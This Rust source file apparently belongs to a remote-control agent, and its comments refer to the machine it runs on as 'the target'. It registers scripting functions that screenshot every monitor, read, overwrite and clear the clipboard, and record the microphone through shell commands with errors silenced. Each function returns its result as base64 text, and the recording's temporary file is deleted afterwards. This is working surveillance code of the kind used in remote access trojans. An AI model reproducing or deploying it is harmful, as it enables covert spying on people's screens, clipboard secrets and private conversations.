// src/agent/scripting/media.rs
use rhai::Engine;
use std::{fs, io::Cursor, time::Duration};
use screenshots::Screen;
use image::ImageOutputFormat;
use arboard::Clipboard;
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
use crate::utils;

pub fn register(engine: &mut Engine) {

    // ── Screenshot ────────────────────────────────────────────────────────────
    // Returns a JSON array: [{monitor_index, width, height, b64}]

    engine.register_fn("internal_screenshot", || -> String {
        let screens  = Screen::all().unwrap_or_default();
        let mut results = Vec::new();
        for (i, screen) in screens.iter().enumerate() {
            if let Ok(image) = screen.capture() {
                let mut cursor = Cursor::new(Vec::new());
                if image.write_to(&mut cursor, ImageOutputFormat::Png).is_ok() {
                    let b64 = BASE64.encode(cursor.get_ref());
                    results.push(serde_json::json!({
                        "monitor_index": i,
                        "width":  screen.display_info.width,
                        "height": screen.display_info.height,
                        "b64":    b64,
                    }));
                }
            }
        }
        serde_json::to_string(&results).unwrap_or("[]".into())
    });

    // ── Clipboard ─────────────────────────────────────────────────────────────

    engine.register_fn("internal_clipboard_get", || -> String {
        match Clipboard::new() {
            Ok(mut cb) => cb.get_text().unwrap_or_else(|e| format!("[Empty/Image] {}", e)),
            Err(e)     => format!("Clipboard Init Error: {}", e),
        }
    });

    engine.register_fn("internal_clipboard_set", |text: &str| -> String {
        match Clipboard::new() {
            Ok(mut cb) => match cb.set_text(text) {
                Ok(_)  => "Success".into(),
                Err(e) => format!("Set Error: {}", e),
            },
            Err(e) => format!("Clipboard Init Error: {}", e),
        }
    });

    engine.register_fn("internal_clipboard_clear", || -> String {
        match Clipboard::new() {
            Ok(mut cb) => match cb.clear() {
                Ok(_)  => "Clipboard Cleared".into(),
                Err(e) => format!("Clear Error: {}", e),
            },
            Err(e) => format!("Clipboard Init Error: {}", e),
        }
    });

    // ── Microphone ────────────────────────────────────────────────────────────
    // Shell-based recording — requires `arecord` (Linux), `sox`/`ffmpeg` (macOS),
    // or `ffmpeg -f dshow` (Windows) on the target.  Returns base64 WAV on
    // success; a descriptive error string if the tool is absent.

    engine.register_fn("internal_mic_record", |seconds: i64| -> String {
        let secs  = seconds.max(1).min(300);
        let tmp   = std::env::temp_dir().join("rcm_mic.wav");
        let tmp_s = tmp.to_string_lossy().to_string();

        let record_cmd = match std::env::consts::OS {
            "linux" => format!(
                "arecord -f cd -t wav -d {} {:?} 2>/dev/null",
                secs, tmp_s,
            ),
            "windows" => format!(
                "ffmpeg -f dshow -i audio=default -t {} {:?} -y 2>$null",
                secs, tmp_s,
            ),
            "macos" => format!(
                "sox -d -t wav {:?} trim 0 {} 2>/dev/null || \
                 ffmpeg -f avfoundation -i ':0' -t {} {:?} -y 2>/dev/null",
                tmp_s, secs, secs, tmp_s,
            ),
            other => return format!("Error: mic recording not supported on {}", other),
        };

        let (out, err, code) = utils::execute_shell_command_timeout(
            &record_cmd,
            Duration::from_secs((secs + 15) as u64),
        );

        if code != 0 && tmp.metadata().map(|m| m.len()).unwrap_or(0) == 0 {
            return format!("Error: recording failed (exit {}): {} {}", code, out, err);
        }

        match fs::read(&tmp) {
            Ok(bytes) => { let _ = fs::remove_file(&tmp); BASE64.encode(&bytes) }
            Err(e)    => format!("Error reading WAV: {}", e),
        }
    });
}
